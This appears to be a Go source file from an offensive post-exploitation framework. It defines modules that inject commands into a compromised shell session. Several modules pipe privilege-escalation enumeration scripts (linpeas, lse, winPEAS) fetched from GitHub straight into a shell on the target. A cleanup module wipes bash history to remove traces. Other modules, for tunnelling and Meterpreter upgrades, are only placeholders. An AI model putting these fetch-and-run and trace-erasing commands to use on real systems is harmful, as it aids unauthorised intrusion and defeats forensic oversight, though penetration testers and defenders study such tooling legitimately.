package modules

import (
	"fmt"
	"github.com/Aryma-f4/necromancy/core"
)

// Module represents an executable script or payload
type Module interface {
	Name() string
	Description() string
	Execute(s *core.Session) error
}

type ModuleManager struct {
	Modules map[string]Module
}

func NewModuleManager() *ModuleManager {
	mm := &ModuleManager{
		Modules: make(map[string]Module),
	}
	
	mm.Register(&LinPeasModule{})
	mm.Register(&WinPeasModule{})
	mm.Register(&LseModule{})
	mm.Register(&PotatoModule{})
	mm.Register(&ChiselModule{})
	mm.Register(&LigoloModule{})
	mm.Register(&NgrokModule{})
	mm.Register(&MeterpreterModule{})
	mm.Register(&CleanupModule{})
	mm.Register(&TraitorModule{})
	mm.Register(&UACModule{})
	mm.Register(&PanixModule{})
	mm.Register(&LinuxProcmemdumpModule{})
	
	return mm
}

func (m *ModuleManager) Register(mod Module) {
	m.Modules[mod.Name()] = mod
}

func (m *ModuleManager) RunModule(name string, s *core.Session) error {
	mod, exists := m.Modules[name]
	if !exists {
		return fmt.Errorf("module '%s' not found", name)
	}
	return mod.Execute(s)
}

// ------------------------------------
// Example Implementations
// ------------------------------------

type LinPeasModule struct{}
func (m *LinPeasModule) Name() string { return "linpeas" }
func (m *LinPeasModule) Description() string { return "Uploads and executes linpeas.sh from GitHub" }
func (m *LinPeasModule) Execute(s *core.Session) error {
	s.Write([]byte("curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n"))
	return nil
}

type WinPeasModule struct{}
func (m *WinPeasModule) Name() string { return "winpeas" }
func (m *WinPeasModule) Description() string { return "Uploads and executes winpeas.bat from GitHub" }
func (m *WinPeasModule) Execute(s *core.Session) error {
	s.Write([]byte("curl.exe -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat -o winpeas.bat && winpeas.bat\n"))
	return nil
}

type LseModule struct{}
func (m *LseModule) Name() string { return "lse" }
func (m *LseModule) Description() string { return "Linux Smart Enumeration" }
func (m *LseModule) Execute(s *core.Session) error {
	s.Write([]byte("curl -L https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh | sh\n"))
	return nil
}

type PotatoModule struct{}
func (m *PotatoModule) Name() string { return "potato" }
func (m *PotatoModule) Description() string { return "JuicyPotato / PrintSpoofer / GodPotato (Placeholder)" }
func (m *PotatoModule) Execute(s *core.Session) error {
	s.Write([]byte("echo '[*] Potato module execution placeholder'\n"))
	return nil
}

type ChiselModule struct{}
func (m *ChiselModule) Name() string { return "chisel" }
func (m *ChiselModule) Description() string { return "Chisel Tunneling" }
func (m *ChiselModule) Execute(s *core.Session) error {
	s.Write([]byte("echo '[*] Chisel module execution placeholder'\n"))
	return nil
}

type LigoloModule struct{}
func (m *LigoloModule) Name() string { return "ligolo" }
func (m *LigoloModule) Description() string { return "Ligolo-ng Tunneling" }
func (m *LigoloModule) Execute(s *core.Session) error {
	s.Write([]byte("echo '[*] Ligolo module execution placeholder'\n"))
	return nil
}

type NgrokModule struct{}
func (m *NgrokModule) Name() string { return "ngrok" }
func (m *NgrokModule) Description() string { return "Ngrok Port Forwarding" }
func (m *NgrokModule) Execute(s *core.Session) error {
	s.Write([]byte("echo '[*] Ngrok module execution placeholder'\n"))
	return nil
}

type MeterpreterModule struct{}
func (m *MeterpreterModule) Name() string { return "meterpreter" }
func (m *MeterpreterModule) Description() string { return "Upgrade to MSF Session (Placeholder)" }
func (m *MeterpreterModule) Execute(s *core.Session) error {
	s.Write([]byte("echo '[*] Meterpreter upgrade execution placeholder'\n"))
	return nil
}

type CleanupModule struct{}
func (m *CleanupModule) Name() string { return "cleanup" }
func (m *CleanupModule) Description() string { return "Clear history and traces" }
func (m *CleanupModule) Execute(s *core.Session) error {
	s.Write([]byte("cat /dev/null > ~/.bash_history && history -c && echo '[+] Cleanup done'\n"))
	return nil
}
